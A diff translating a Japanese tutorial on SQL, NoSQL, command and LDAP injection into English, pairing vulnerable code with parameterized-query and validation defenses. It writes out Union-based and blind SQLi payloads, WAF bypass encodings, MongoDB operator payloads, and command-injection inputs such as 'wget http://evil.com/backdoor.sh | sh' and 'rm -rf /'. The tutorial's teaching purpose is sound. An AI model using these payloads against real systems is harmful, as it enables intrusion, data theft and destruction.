@@ -1,122 +1,122 @@
-# インジェクション
+# Injection
 
-> SQL、NoSQL、コマンド、LDAPインジェクションの攻撃手法と、パラメータ化クエリ、ORM、入力検証による体系的な防御策を解説する。
+> Explains attack techniques for SQL, NoSQL, command, and LDAP injection, along with systematic defenses using parameterized queries, ORMs, and input validation.
 
-## 前提知識
+## Prerequisites
 
-- SQL の基本文法（SELECT / INSERT / UPDATE / DELETE）
-- HTTP リクエストとレスポンスの基礎（[../04-application-security/00-secure-coding.md](../04-application-security/00-secure-coding.md)）
-- Python の基礎文法（コード例の理解のため）
+- Basic SQL syntax (SELECT / INSERT / UPDATE / DELETE)
+- Fundamentals of HTTP requests and responses ([../04-application-security/00-secure-coding.md](../04-application-security/00-secure-coding.md))
+- Basic Python syntax (for understanding code examples)
 
-## この章で学ぶこと
+## What You Will Learn
 
-1. **各種インジェクション攻撃**（SQL/NoSQL/コマンド/LDAP/テンプレート）の原理と危険性を理解する
-2. **パラメータ化クエリとORM**を使った根本的な防御手法を習得する
-3. **入力検証と出力エンコード**による多層防御のアプローチを身につける
-4. **Second-order インジェクション**などの高度な攻撃パターンを認識する
-5. **WAF バイパス手法**を理解し、根本対策の重要性を認識する
+1. Understand the principles and dangers of **various injection attacks** (SQL/NoSQL/command/LDAP/template)
+2. Master **parameterized queries and ORMs** as fundamental defense techniques
+3. Learn a **multi-layered defense approach** using input validation and output encoding
+4. Recognize advanced attack patterns such as **second-order injection**
+5. Understand **WAF bypass techniques** and the importance of root-cause countermeasures
 
 ---
 
-## 1. インジェクション攻撃の原理
+## 1. Principles of Injection Attacks
 
-インジェクションとは、ユーザー入力がコード・クエリ・コマンドの一部として解釈されることで、攻撃者が意図しない操作を実行する脆弱性である。OWASP Top 10 2021 では第3位（A03:2021-Injection）にランクされている。
+Injection is a vulnerability in which user input is interpreted as part of code, queries, or commands, allowing attackers to execute unintended operations. It is ranked third in the OWASP Top 10 2021 (A03:2021-Injection).
 
-### 1.1 インジェクションが発生する根本原因
-
-```
-インジェクションの根本原因: データとコードの混在
-
-  正常な処理:
-  +-------------------------------------------------+
-  | SQL文（コード）: SELECT * FROM users WHERE name = |
-  | ユーザー入力（データ）: 'alice'                    |
-  | → データは「値」として処理される                    |
-  +-------------------------------------------------+
-
-  インジェクション:
-  +-------------------------------------------------+
-  | SQL文（コード）: SELECT * FROM users WHERE name = |
-  | ユーザー入力（コード+データ）: '' OR '1'='1'       |
-  | → 入力がSQL文の「構造」を変えてしまう              |
-  +-------------------------------------------------+
-
-  根本的な解決策: データとコードを分離する
-  → パラメータ化クエリ / プリペアドステートメント
-```
+### 1.1 Root Cause of Injection
 
 ```
-インジェクションの基本原理:
+Root cause of injection: mixing data and code
 
-  正常なリクエスト:
-  ユーザー入力: "alice"
-  生成SQL: SELECT * FROM users WHERE name = 'alice'
+  Normal processing:
+  +-------------------------------------------------+
+  | SQL statement (code): SELECT * FROM users WHERE name = |
+  | User input (data): 'alice'                    |
+  | → Input is treated as a "value"               |
+  +-------------------------------------------------+
+
+  Injection:
+  +-------------------------------------------------+
+  | SQL statement (code): SELECT * FROM users WHERE name = |
+  | User input (code+data): '' OR '1'='1'         |
+  | → Input changes the "structure" of the SQL    |
+  +-------------------------------------------------+
+
+  Fundamental solution: separate data from code
+  → Parameterized queries / prepared statements
+```
+
+```
+Basic principle of injection:
+
+  Normal request:
+  User input: "alice"
+  Generated SQL: SELECT * FROM users WHERE name = 'alice'
                                         ^^^^^^^^
-                                        データとして扱われる
+                                        Treated as data
 
-  攻撃リクエスト:
-  ユーザー入力: "' OR '1'='1"
-  生成SQL: SELECT * FROM users WHERE name = '' OR '1'='1'
+  Attack request:
+  User input: "' OR '1'='1"
+  Generated SQL: SELECT * FROM users WHERE name = '' OR '1'='1'
                                         ^^^^^^^^^^^^^^^^^^^^^
-                                        コードとして解釈される!
+                                        Interpreted as code!
 ```
 
-### 1.2 インジェクションの影響範囲
+### 1.2 Impact Scope of Injection
 
 ```
-インジェクション攻撃で可能なこと:
+What injection attacks can do:
 
   +-------------------+------------------------------------------+
-  | 攻撃の種類        | 影響                                      |
+  | Attack type       | Impact                                   |
   +-------------------+------------------------------------------+
-  | データ窃取        | 全テーブルのデータ読み取り                   |
-  | 認証バイパス       | 管理者アカウントへの不正ログイン              |
-  | データ改ざん       | レコードの挿入・更新・削除                   |
-  | 権限昇格          | DB管理者権限の取得                          |
-  | OS コマンド実行    | xp_cmdshell (SQL Server) 等でOS操作       |
-  | ファイル読み書き   | LOAD_FILE() / INTO OUTFILE (MySQL)       |
-  | DoS              | 重いクエリで DB を過負荷にする               |
-  | 二次攻撃の足掛かり | 他システムへのピボット                       |
+  | Data theft        | Read all table data                      |
+  | Auth bypass       | Unauthorized login as admin account      |
+  | Data tampering    | Insert, update, or delete records        |
+  | Privilege escalation | Obtain DB administrator privileges   |
+  | OS command execution | OS operations via xp_cmdshell (SQL Server), etc. |
+  | File read/write   | LOAD_FILE() / INTO OUTFILE (MySQL)       |
+  | DoS               | Overload DB with heavy queries           |
+  | Pivot to secondary attacks | Lateral movement to other systems |
   +-------------------+------------------------------------------+
 ```
 
 ---
 
-## 2. SQLインジェクション
+## 2. SQL Injection
 
-### 2.1 基本的な攻撃パターン
+### 2.1 Basic Attack Patterns
 
 ```python
-# コード例1: SQLインジェクションの攻撃パターンと防御
+# Code example 1: SQL injection attack patterns and defenses
 
 import sqlite3
 
-# === 脆弱なコード ===
+# === Vulnerable code ===
 def login_vulnerable(username, password):
-    """文字列連結によるSQL構築 -> SQLインジェクション脆弱"""
+    """SQL built by string concatenation -> SQL injection vulnerability"""
     conn = sqlite3.connect("app.db")
     query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
-    # 攻撃例: username = "admin' --"
-    # 生成SQL: SELECT * FROM users WHERE username='admin' --' AND password=''
-    # -- 以降はコメント -> パスワード検証がスキップされる
+    # Attack example: username = "admin' --"
+    # Generated SQL: SELECT * FROM users WHERE username='admin' --' AND password=''
+    # Everything after -- is a comment -> password check is skipped
     result = conn.execute(query).fetchone()
     return result is not None
 
-# === 安全なコード: パラメータ化クエリ ===
+# === Safe code: parameterized query ===
 def login_safe(username, password):
-    """パラメータ化クエリで安全にSQLを実行"""
+    """Execute SQL safely using parameterized queries"""
     conn = sqlite3.connect("app.db")
     query = "SELECT * FROM users WHERE username=? AND password=?"
-    # ? はプレースホルダ -> 入力は常にデータとして扱われる
+    # ? is a placeholder -> input is always treated as data
     result = conn.execute(query, (username, password)).fetchone()
     return result is not None
 
-# === さらに安全: ORM使用 ===
+# === Even safer: using ORM ===
 from sqlalchemy.orm import Session
 from sqlalchemy import select
 
 def login_orm(session: Session, username: str, password_hash: str):
-    """ORMを使用した安全なクエリ"""
+    """Safe query using ORM"""
     stmt = select(User).where(
         User.username == username,
         User.password_hash == password_hash,
@@ -124,157 +124,157 @@ def login_orm(session: Session, username: str, password_hash: str):
     return session.execute(stmt).scalar_one_or_none()
 ```
 
-### 2.2 高度なSQLインジェクション
+### 2.2 Advanced SQL Injection
 
 ```
-SQLインジェクションの種類:
+Types of SQL injection:
 
 +----------------+-----------------------------+------------------+
-| 種類           | 特徴                        | 検出難度         |
+| Type           | Characteristics             | Detection difficulty |
 +----------------+-----------------------------+------------------+
-| Classic        | エラーメッセージから情報取得  | 低               |
-| Union-based    | UNIONで他テーブルのデータ取得 | 中               |
-| Blind (Boolean)| 真偽値の応答差から情報推測    | 高               |
-| Blind (Time)   | レスポンス時間差から情報推測  | 高               |
-| Second-order   | 保存後に別の場所で発動       | 非常に高         |
-| Out-of-Band    | 外部チャネルでデータ送出      | 非常に高         |
+| Classic        | Extracts info from error messages | Low          |
+| Union-based    | Retrieves data from other tables via UNION | Medium |
+| Blind (Boolean)| Infers info from true/false response differences | High |
+| Blind (Time)   | Infers info from response time differences | High |
+| Second-order   | Triggered later after storage | Very high      |
+| Out-of-Band    | Exfiltrates data via external channel | Very high  |
 +----------------+-----------------------------+------------------+
 ```
 
-### 2.3 Union-based SQLインジェクションの詳細
+### 2.3 Union-based SQL Injection in Detail
 
 ```
-Union-based SQLインジェクションの手順:
+Steps of Union-based SQL injection:
 
-  Step 1: カラム数の特定
-  入力: ' ORDER BY 1-- (成功)
-  入力: ' ORDER BY 2-- (成功)
-  入力: ' ORDER BY 3-- (エラー → カラム数は2)
+  Step 1: Identify the number of columns
+  Input: ' ORDER BY 1-- (success)
+  Input: ' ORDER BY 2-- (success)
+  Input: ' ORDER BY 3-- (error → number of columns is 2)
 
-  Step 2: 表示可能なカラムの特定
-  入力: ' UNION SELECT 1,2--
-  → 画面に "1" や "2" が表示される位置を確認
+  Step 2: Identify displayable columns
+  Input: ' UNION SELECT 1,2--
+  → Check where "1" or "2" appears on the page
 
-  Step 3: データベース情報の取得
-  入力: ' UNION SELECT version(),database()--
+  Step 3: Retrieve database information
+  Input: ' UNION SELECT version(),database()--
   → MySQL 8.0.28, myapp_db
 
-  Step 4: テーブル一覧の取得
-  入力: ' UNION SELECT table_name,NULL
+  Step 4: List all tables
+  Input: ' UNION SELECT table_name,NULL
          FROM information_schema.tables
          WHERE table_schema=database()--
 
-  Step 5: カラム情報の取得
-  入力: ' UNION SELECT column_name,data_type
+  Step 5: Retrieve column information
+  Input: ' UNION SELECT column_name,data_type
          FROM information_schema.columns
          WHERE table_name='users'--
 
-  Step 6: データの抽出
-  入力: ' UNION SELECT username,password FROM users--
+  Step 6: Extract data
+  Input: ' UNION SELECT username,password FROM users--
 ```
 
 ```python
-# コード例2: Blind SQLインジェクションの仕組みと対策
+# Code example 2: How Blind SQL injection works and countermeasures
 import time
 
-# Blind (Boolean-based) の攻撃例
-# 攻撃者のスクリプト（説明目的のみ）
+# Blind (Boolean-based) attack example
+# Attacker's script (for explanation purposes only)
 def demonstrate_blind_sqli_concept():
     """
-    Blind SQLiの原理を示す概念コード。
-    実際のペネトレーションテストでは sqlmap 等のツールを使用する。
+    Conceptual code showing the principle of Blind SQLi.
+    In actual penetration testing, tools like sqlmap are used.
 
-    脆弱なエンドポイント: /user?id=1
-    正常: /user?id=1 → 200 OK (ユーザー情報表示)
-    攻撃: /user?id=1 AND 1=1 → 200 OK (真)
-    攻撃: /user?id=1 AND 1=2 → 404 Not Found (偽)
-    → レスポンスの差異から情報を1ビットずつ抽出
+    Vulnerable endpoint: /user?id=1
+    Normal: /user?id=1 → 200 OK (user info displayed)
+    Attack: /user?id=1 AND 1=1 → 200 OK (true)
+    Attack: /user?id=1 AND 1=2 → 404 Not Found (false)
+    → Extracts information one bit at a time from response differences
 
-    例: データベース名の1文字目を特定
-    /user?id=1 AND SUBSTRING(database(),1,1)='a' → 404 (偽)
-    /user?id=1 AND SUBSTRING(database(),1,1)='b' → 404 (偽)
+    Example: Identifying the first character of the database name
+    /user?id=1 AND SUBSTRING(database(),1,1)='a' → 404 (false)
+    /user?id=1 AND SUBSTRING(database(),1,1)='b' → 404 (false)
     ...
-    /user?id=1 AND SUBSTRING(database(),1,1)='m' → 200 (真!)
-    → データベース名の1文字目は 'm'
+    /user?id=1 AND SUBSTRING(database(),1,1)='m' → 200 (true!)
+    → First character of the database name is 'm'
     """
     pass
 
-# Time-based Blind SQLiの原理
+# Principle of Time-based Blind SQLi
 def demonstrate_time_based_concept():
     """
-    レスポンスの有無ではなく、応答時間で真偽を判定する。
+    Determines true/false not by response presence but by response time.
 
     /user?id=1; IF(SUBSTRING(database(),1,1)='m',
                     SLEEP(5), 0)
-    → 5秒の遅延 = 真 (1文字目は 'm')
-    → 即応答 = 偽
+    → 5-second delay = true (first character is 'm')
+    → Immediate response = false
 
-    対策: パラメータ化クエリを使用すればこれらの攻撃は全て防げる。
+    Countermeasure: Using parameterized queries prevents all such attacks.
     """
     pass
 ```
 
-### 2.4 Second-order SQLインジェクション
+### 2.4 Second-order SQL Injection
 
 ```python
-# コード例3: Second-order SQLインジェクションの例と対策
+# Code example 3: Example of second-order SQL injection and countermeasures
 
-# Second-order: 入力時ではなく、保存したデータの使用時に発動
+# Second-order: triggered not at input time, but when stored data is used
 
-# 脆弱なコード
+# Vulnerable code
 def register_user(username, password):
-    """ユーザー登録（パラメータ化されているので安全に見える）"""
+    """User registration (looks safe because it's parameterized)"""
     db.execute(
         "INSERT INTO users (username, password) VALUES (?, ?)",
-        (username, password)  # ここは安全
+        (username, password)  # Safe here
     )
 
 def change_password(username, new_password):
-    """パスワード変更（ここが脆弱!）"""
-    # usernameをDBから取得してSQLに埋め込む
+    """Password change (vulnerable here!)"""
+    # Fetch username from DB and embed it in SQL
     user = db.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()
-    # user["username"] = "admin'--" (登録時に仕込まれた値)
+    # user["username"] = "admin'--" (value planted during registration)
     db.execute(
         f"UPDATE users SET password='{new_password}' WHERE username='{user['username']}'"
     )
-    # 結果: UPDATE users SET password='...' WHERE username='admin'--'
-    # admin のパスワードが変更される!
+    # Result: UPDATE users SET password='...' WHERE username='admin'--'
+    # admin's password is changed!
 
-# 安全なコード: すべてのSQL文でパラメータ化を徹底
+# Safe code: always use parameterization for all SQL statements
 def change_password_safe(username, new_password):
     db.execute(
         "UPDATE users SET password=? WHERE username=?",
-        (new_password, username)  # 常にパラメータ化
+        (new_password, username)  # Always parameterized
     )
 ```
 
 ```
-Second-order SQLインジェクションのフロー:
+Flow of second-order SQL injection:
 
-  攻撃者                  アプリケーション              データベース
+  Attacker               Application                Database
     |                          |                          |
-    |-- 登録: username =  ---->|                          |
-    |   "admin'--"             |-- INSERT (パラメータ化) ->|
-    |                          |   安全に保存される         |
+    |-- Register: username = ->|                          |
+    |   "admin'--"             |-- INSERT (parameterized) ->|
+    |                          |   Stored safely           |
     |                          |                          |
-    |   (後日)                  |                          |
-    |-- パスワード変更依頼 ---->|                          |
-    |                          |-- SELECT (パラメータ化) ->|
-    |                          |<-- "admin'--" を取得 ----|
+    |   (later)                |                          |
+    |-- Request password change ->|                       |
+    |                          |-- SELECT (parameterized) ->|
+    |                          |<-- Retrieves "admin'--" --|
     |                          |                          |
-    |                          |-- UPDATE (文字列連結!) -->|
+    |                          |-- UPDATE (string concat!) ->|
     |                          |   WHERE username='admin'--|
-    |                          |   → admin のパスワードが  |
-    |                          |     変更される!           |
+    |                          |   → admin's password      |
+    |                          |     gets changed!         |
 
-  教訓: データベースから取得した値も信頼してはならない。
-        すべてのSQL文でパラメータ化を徹底すること。
+  Lesson: Do not trust values retrieved from the database either.
+          Always use parameterization for all SQL statements.
 ```
 
-### 2.5 DB ごとのパラメータ化クエリ構文
+### 2.5 Parameterized Query Syntax per DB
 
 ```python
-# コード例4: 各データベース/言語でのパラメータ化クエリ
+# Code example 4: Parameterized queries in various databases/languages
 
 # --- Python ---
 
@@ -297,9 +297,9 @@ cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))
 
 # SQLAlchemy ORM
 from sqlalchemy import select, text
-# ORM クエリ（自動的にパラメータ化）
+# ORM query (automatically parameterized)
 stmt = select(User).where(User.id == user_id)
-# text() を使う場合（バインドパラメータ指定）
+# When using text() (specify bind parameters)
 stmt = text("SELECT * FROM users WHERE id = :id").bindparams(id=user_id)
 
 # --- Java ---
@@ -321,131 +321,131 @@ stmt = text("SELECT * FROM users WHERE id = :id").bindparams(id=user_id)
 # )
 ```
 
-### 2.6 SQLインジェクションのWAFバイパス手法
+### 2.6 WAF Bypass Techniques for SQL Injection
 
 ```
-WAF バイパス手法（なぜ WAF だけでは不十分か）:
+WAF bypass techniques (why WAF alone is insufficient):
 
-  1. 大文字小文字の混在:
-     SeLeCt → SELECT と同じ意味
+  1. Mixed case:
+     SeLeCt → same meaning as SELECT
 
-  2. コメント挿入:
+  2. Comment insertion:
      SEL/**/ECT → SELECT
      UN/**/ION → UNION
 
-  3. エンコーディング:
-     %53%45%4C%45%43%54 → SELECT (URLエンコード)
+  3. Encoding:
+     %53%45%4C%45%43%54 → SELECT (URL encoding)
      CHAR(83,69,76,69,67,84) → SELECT (ASCII)
 
-  4. 同等の関数・構文:
+  4. Equivalent functions/syntax:
      SUBSTRING() → SUBSTR() → MID()
      CONCAT() → || (Oracle/SQLite)
      IF() → CASE WHEN ... THEN ... ELSE ... END
 
-  5. ホワイトスペースの代替:
-     SELECT\t*\tFROM → TABで区切り
-     SELECT%0a*%0aFROM → 改行で区切り
-     SELECT/**/*//**/FROM → コメントで区切り
+  5. Whitespace alternatives:
+     SELECT\t*\tFROM → separated by TAB
+     SELECT%0a*%0aFROM → separated by newline
+     SELECT/**/*/**/ FROM → separated by comments
 
-  6. 二重エンコーディング:
-     %2527 → %27 → ' (サーバーが二重デコードする場合)
+  6. Double encoding:
+     %2527 → %27 → ' (when server double-decodes)
 
-  7. HTTP パラメータ汚染:
-     ?id=1&id=UNION+SELECT → サーバーが後者を使用する場合
+  7. HTTP parameter pollution:
+     ?id=1&id=UNION+SELECT → when server uses the latter
 
-  結論: WAF はバイパス可能。根本対策はパラメータ化クエリのみ。
+  Conclusion: WAF can be bypassed. The only root-cause fix is parameterized queries.
 ```
 
 ---
 
-## 3. NoSQLインジェクション
+## 3. NoSQL Injection
 
-### 3.1 MongoDB に対する攻撃
+### 3.1 Attacks Against MongoDB
 
 ```python
-# コード例5: NoSQLインジェクション（MongoDB）の攻撃と対策
+# Code example 5: NoSQL injection (MongoDB) attacks and defenses
 from pymongo import MongoClient
 
 client = MongoClient("mongodb://localhost:27017")
 db = client["myapp"]
 
-# === 脆弱なコード ===
+# === Vulnerable code ===
 def find_user_vulnerable(request_data):
-    """JSONデータをそのままクエリに使用 -> NoSQL injection"""
+    """Using JSON data directly in queries -> NoSQL injection"""
     username = request_data["username"]
     password = request_data["password"]
-    # 攻撃: {"username": "admin", "password": {"$ne": ""}}
-    # $ne (not equal) で空文字以外 -> 任意のパスワードで認証成功
+    # Attack: {"username": "admin", "password": {"$ne": ""}}
+    # $ne (not equal) matches anything non-empty -> auth succeeds with any password
     user = db.users.find_one({"username": username, "password": password})
     return user
 
-# === 安全なコード ===
+# === Safe code ===
 def find_user_safe(request_data):
-    """入力をバリデーションしてからクエリに使用"""
+    """Validate input before using in queries"""
     username = request_data.get("username", "")
     password = request_data.get("password", "")
 
-    # 型チェック: 文字列のみ許可（オブジェクトを拒否）
+    # Type check: only strings allowed (reject objects)
     if not isinstance(username, str) or not isinstance(password, str):
         raise ValueError("Invalid input type")
 
-    # 長さ制限
+    # Length limit
     if len(username) > 100 or len(password) > 200:
         raise ValueError("Input too long")
 
-    # MongoDB演算子の除去
+    # Remove MongoDB operators
     if any(key.startswith("$") for key in [username, password]
            if isinstance(key, str) and key.startswith("$")):
         raise ValueError("Invalid characters in input")
 
     user = db.users.find_one({
-        "username": str(username),  # 明示的に文字列に変換
+        "username": str(username),  # Explicitly convert to string
         "password_hash": hash_password(str(password)),
     })
     return user
 ```
 
-### 3.2 NoSQLインジェクションの攻撃パターン
+### 3.2 NoSQL Injection Attack Patterns
 
 ```
-MongoDB NoSQLインジェクションの攻撃パターン:
+MongoDB NoSQL injection attack patterns:
 
-  1. 演算子インジェクション:
+  1. Operator injection:
      {"username": "admin", "password": {"$ne": ""}}
-     → password が空文字でないもの → 任意のパスワードで認証
+     → password is not empty → auth succeeds with any password
 
      {"username": "admin", "password": {"$gt": ""}}
-     → password が空文字より大きいもの → 同様に認証バイパス
+     → password is greater than empty string → same auth bypass
 
      {"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
-     → 正規表現でユーザー名を部分一致
+     → partial username match via regex
 
-  2. $where インジェクション:
+  2. $where injection:
      {"$where": "this.username == 'admin' && this.password == '" + input + "'"}
-     → input = "' || '1'=='1" で全レコードにマッチ
+     → input = "' || '1'=='1" matches all records
 
-  3. 配列操作:
+  3. Array manipulation:
      {"username": "admin", "password": ["password1", "password2"]}
-     → 配列のいずれかに一致すれば認証成功（MongoDB の挙動による）
+     → Auth succeeds if any array element matches (depending on MongoDB behavior)
 
-  4. JavaScript インジェクション（$where / mapReduce）:
+  4. JavaScript injection ($where / mapReduce):
      {"$where": "function() { return this.username == '" + input + "' }"}
-     → input にJSコードを挿入可能
+     → JS code can be injected through input
 
-  対策:
-  - 入力の型を厳密にチェック（文字列のみ許可）
-  - $ で始まるキーを拒否
-  - MongoDB の演算子をホワイトリストで制限
-  - $where / mapReduce の使用を避ける
+  Countermeasures:
+  - Strictly check input types (allow only strings)
+  - Reject keys beginning with $
+  - Whitelist-restrict MongoDB operators
+  - Avoid using $where / mapReduce
 ```
 
 ```python
-# コード例6: MongoDB向け包括的なインジェクション防御
+# Code example 6: Comprehensive injection defense for MongoDB
 import re
 from typing import Any
 
 class MongoSanitizer:
-    """MongoDB クエリの入力サニタイゼーション"""
+    """Input sanitization for MongoDB queries"""
 
     MONGO_OPERATORS = {
         "$gt", "$gte", "$lt", "$lte", "$ne", "$in", "$nin",
@@ -456,15 +456,15 @@ class MongoSanitizer:
 
     @staticmethod
     def sanitize_value(value: Any) -> Any:
-        """クエリ値をサニタイズ"""
+        """Sanitize query values"""
         if isinstance(value, str):
-            # 文字列はそのまま（安全）
+            # Strings are safe as-is
             return value
         elif isinstance(value, (int, float, bool)):
-            # プリミティブ型は安全
+            # Primitive types are safe
             return value
         elif isinstance(value, dict):
-            # 辞書型（MongoDB演算子の可能性）
+            # Dict type (may contain MongoDB operators)
             for key in value:
                 if key.startswith("$"):
                     raise ValueError(
@@ -472,14 +472,14 @@ class MongoSanitizer:
                     )
             return value
         elif isinstance(value, list):
-            # リスト型は各要素をサニタイズ
+            # List type: sanitize each element
             return [MongoSanitizer.sanitize_value(v) for v in value]
         else:
             raise ValueError(f"Unsupported type: {type(value)}")
 
     @staticmethod
     def sanitize_query(query: dict) -> dict:
-        """クエリ全体をサニタイズ"""
+        """Sanitize entire query"""
         sanitized = {}
         for key, value in query.items():
             if key.startswith("$"):
@@ -487,17 +487,17 @@ class MongoSanitizer:
             sanitized[key] = MongoSanitizer.sanitize_value(value)
         return sanitized
 
-# 使用例
+# Usage example
 sanitizer = MongoSanitizer()
 try:
-    # 正常なクエリ
+    # Normal query
     safe_query = sanitizer.sanitize_query({
         "username": "alice",
         "age": 25,
     })
     result = db.users.find_one(safe_query)
 
-    # 攻撃クエリ → 例外が発生
+    # Malicious query → exception raised
     malicious = sanitizer.sanitize_query({
         "username": "admin",
         "password": {"$ne": ""},  # ValueError!
@@ -508,46 +508,46 @@ except ValueError as e:
 
 ---
 
-## 4. コマンドインジェクション
+## 4. Command Injection
 
-### 4.1 攻撃の仕組みと対策
+### 4.1 How Attacks Work and Defenses
 
 ```python
-# コード例7: コマンドインジェクションの攻撃と対策
+# Code example 7: Command injection attacks and defenses
 import subprocess
 import shlex
 import re
 
-# === 脆弱なコード ===
+# === Vulnerable code ===
 def ping_host_vulnerable(host):
-    """os.systemやshell=Trueでのコマンド実行 -> コマンドインジェクション"""
+    """Command execution with os.system or shell=True -> command injection"""
     import os
     os.system(f"ping -c 3 {host}")
-    # 攻撃: host = "google.com; cat /etc/passwd"
-    # 実行: ping -c 3 google.com; cat /etc/passwd
+    # Attack: host = "google.com; cat /etc/passwd"
+    # Executed: ping -c 3 google.com; cat /etc/passwd
 
-# === 安全なコード ===
+# === Safe code ===
 def ping_host_safe(host: str) -> str:
-    """安全なコマンド実行"""
-    # Step 1: 入力バリデーション（ホワイトリスト方式）
+    """Safe command execution"""
+    # Step 1: Input validation (whitelist approach)
     if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
         raise ValueError(f"Invalid hostname: {host}")
 
-    # Step 2: shell=Falseでリスト形式で引数を渡す
+    # Step 2: Pass arguments as a list with shell=False
     result = subprocess.run(
-        ["ping", "-c", "3", host],  # リスト形式 -> シェル解釈されない
+        ["ping", "-c", "3", host],  # List form -> not interpreted by shell
         capture_output=True,
         text=True,
         timeout=10,
-        shell=False,  # 明示的にFalse（デフォルトだが明示する）
+        shell=False,  # Explicitly False (default, but made explicit)
     )
     return result.stdout
 
-# === より安全: 外部コマンドを使わない ===
+# === Even safer: avoid external commands ===
 import socket
 
 def check_host_reachable(host: str) -> bool:
-    """外部コマンドを使わずにホストの到達性を確認"""
+    """Check host reachability without external commands"""
     if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
         raise ValueError(f"Invalid hostname: {host}")
     try:
@@ -557,48 +557,48 @@ def check_host_reachable(host: str) -> bool:
         return False
 ```
 
-### 4.2 コマンドインジェクションの攻撃パターン
+### 4.2 Command Injection Attack Patterns
 
 ```
-コマンドインジェクションの構文:
+Command injection syntax:
 
-  シェルメタ文字による攻撃:
+  Attacks using shell metacharacters:
   +------------------+---------------------------------------+
-  | メタ文字         | 効果                                   |
+  | Metacharacter    | Effect                                |
   +------------------+---------------------------------------+
-  | ;                | コマンドの連結（前のコマンドの成否に関わらず）|
-  | &&               | 前のコマンドが成功した場合に実行          |
-  | ||               | 前のコマンドが失敗した場合に実行          |
-  | |                | パイプ（前のコマンドの出力を入力にする）   |
-  | $(command)       | コマンド置換                             |
-  | `command`        | コマンド置換（バッククォート）             |
-  | > file           | 出力をファイルにリダイレクト              |
-  | < file           | ファイルから入力                         |
-  | \n               | 改行（新しいコマンドとして解釈）          |
+  | ;                | Command chaining (regardless of exit status) |
+  | &&               | Execute if previous command succeeded |
+  | ||               | Execute if previous command failed    |
+  | |                | Pipe (feed output of previous command as input) |
+  | $(command)       | Command substitution                  |
+  | `command`        | Command substitution (backtick)       |
+  | > file           | Redirect output to file               |
+  | < file           | Read input from file                  |
+  | \n               | Newline (interpreted as new command)  |
   +------------------+---------------------------------------+
 
-  攻撃例:
-  入力: "google.com; rm -rf /"
-  入力: "google.com && wget http://evil.com/backdoor.sh | sh"
-  入力: "google.com$(cat /etc/passwd)"
-  入力: "google.com`whoami`"
+  Attack examples:
+  Input: "google.com; rm -rf /"
+  Input: "google.com && wget http://evil.com/backdoor.sh | sh"
+  Input: "google.com$(cat /etc/passwd)"
+  Input: "google.com`whoami`"
 ```
 
 ```python
-# コード例8: 安全なサブプロセス実行のラッパー
+# Code example 8: Safe subprocess execution wrapper
 import subprocess
 import re
 from typing import Optional
 
 class SafeCommandRunner:
-    """安全なコマンド実行ラッパー
+    """Safe command execution wrapper
 
-    原則:
-    1. shell=False を常に使用
-    2. 引数はリスト形式で渡す
-    3. 入力をホワイトリストで検証
-    4. タイムアウトを設定
-    5. 実行可能コマンドを制限
+    Principles:
+    1. Always use shell=False
+    2. Pass arguments as a list
+    3. Validate input with a whitelist
+    4. Set a timeout
+    5. Restrict executable commands
     """
 
     ALLOWED_COMMANDS = {
@@ -621,23 +621,23 @@ class SafeCommandRunner:
 
     def run(self, command: str, args: list, user_input: str,
             timeout: int = 10) -> Optional[str]:
-        """安全にコマンドを実行"""
-        # コマンドのホワイトリストチェック
+        """Execute a command safely"""
+        # Whitelist check for command
         if command not in self.ALLOWED_COMMANDS:
             raise ValueError(f"Command not allowed: {command}")
 
         cmd_config = self.ALLOWED_COMMANDS[command]
 
-        # 引数のホワイトリストチェック
+        # Whitelist check for arguments
         for arg in args:
             if arg not in cmd_config["allowed_args"]:
                 raise ValueError(f"Argument not allowed: {arg}")
 
-        # ユーザー入力のバリデーション
+        # Validate user input
         if not re.match(cmd_config["input_pattern"], user_input):
             raise ValueError(f"Invalid input: {user_input}")
 
-        # コマンド実行（フルパスを使用）
+        # Execute command (use full path)
         cmd = [cmd_config["path"]] + args + [user_input]
 
         try:
@@ -647,38 +647,38 @@ class SafeCommandRunner:
                 text=True,
                 timeout=timeout,
                 shell=False,
-                env={},  # 環境変数を空にする（PATH injection防止）
+                env={},  # Empty environment variables (prevent PATH injection)
             )
             return result.stdout
         except subprocess.TimeoutExpired:
             return None
 
-# 使用例
+# Usage example
 runner = SafeCommandRunner()
 output = runner.run("ping", ["-c", "3"], "example.com")
 ```
 
 ---
 
-## 5. LDAPインジェクション
+## 5. LDAP Injection
 
-### 5.1 攻撃の仕組み
+### 5.1 How Attacks Work
 
 ```python
-# コード例9: LDAPインジェクションの攻撃と対策
+# Code example 9: LDAP injection attacks and defenses
 
-# === 脆弱なコード ===
+# === Vulnerable code ===
 def search_user_vulnerable(username):
-    """文字列連結によるLDAPフィルタ構築"""
+    """Build LDAP filter by string concatenation"""
     ldap_filter = f"(&(uid={username})(objectClass=person))"
-    # 攻撃: username = "*)(uid=*))(|(uid=*"
-    # 生成: (&(uid=*)(uid=*))(|(uid=*)(objectClass=person))
-    # -> 全ユーザーが返される
+    # Attack: username = "*)(uid=*))(|(uid=*"
+    # Generated: (&(uid=*)(uid=*))(|(uid=*)(objectClass=person))
+    # -> All users are returned
     return ldap_conn.search_s(base_dn, ldap.SCOPE_SUBTREE, ldap_filter)
 
-# === 安全なコード ===
+# === Safe code ===
 def ldap_escape(value: str) -> str:
-    """LDAP特殊文字をエスケープする（RFC 4515準拠）"""
+    """Escape LDAP special characters (RFC 4515 compliant)"""
     escape_chars = {
         '\\': r'\5c',
         '*': r'\2a',
@@ -687,14 +687,14 @@ def ldap_escape(value: str) -> str:
         '\x00': r'\00',
     }
     result = value
-    # バックスラッシュを最初にエスケープする（順序重要）
+    # Escape backslash first (order matters)
     for char, replacement in escape_chars.items():
         result = result.replace(char, replacement)
     return result
 
 def search_user_safe(username: str):
-    """エスケープ済みのLDAPフィルタを構築"""
-    # 入力バリデーション
+    """Build LDAP filter with escaped input"""
+    # Input validation
     if not username or len(username) > 100:
         raise ValueError("Invalid username")
 
@@ -703,20 +703,20 @@ def search_user_safe(username: str):
     return ldap_conn.search_s(base_dn, ldap.SCOPE_SUBTREE, ldap_filter)
 ```
 
-### 5.2 LDAP DN（Distinguished Name）インジェクション
+### 5.2 LDAP DN (Distinguished Name) Injection
 
 ```
-LDAP DN インジェクション:
+LDAP DN injection:
 
